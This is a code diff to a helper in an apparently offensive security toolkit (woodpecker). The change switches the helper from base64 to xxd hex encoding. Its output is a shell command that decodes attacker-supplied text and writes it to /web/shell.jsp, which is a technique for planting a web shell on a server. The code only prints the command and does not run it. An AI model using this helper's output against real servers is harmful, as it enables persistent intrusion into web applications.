@@ -2,16 +2,17 @@ package me.gv7.woodpecker.plugin.payload;
 
 import me.gv7.woodpecker.plugin.*;
 import me.gv7.woodpecker.tools.codec.BASE64Encoder;
+import me.gv7.woodpecker.tools.codec.HexUtil;
 
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 
-public class LinuxBase64EchoTextConverter implements IHelper {
+public class LinuxXXDEchoTextConverter implements IHelper {
 
     @Override
     public String getHelperTabCaption() {
-        return "Linux Base64 Echo To File";
+        return "Linux XXD Echo To File";
     }
 
     @Override
@@ -32,8 +33,8 @@ public class LinuxBase64EchoTextConverter implements IHelper {
     public void doHelp(Map<String, Object> customArgs, IResultOutput iResultOutput) {
         String text = (String)customArgs.get("all");
         try {
-            String payload = new BASE64Encoder().encode(text.getBytes()).replaceAll("\\s+","");
-            String command = String.format("echo \"%s\"|base64 -d > /web/shell.jsp",payload);
+            String payload = HexUtil.encode(text.getBytes());
+            String command = String.format("echo \"%s\"|xxd -r -ps > /web/shell.jsp",payload.toUpperCase());
             iResultOutput.successPrintln("Converter finish! command:");
             iResultOutput.rawPrintln("\n");
             iResultOutput.rawPrintln(command);
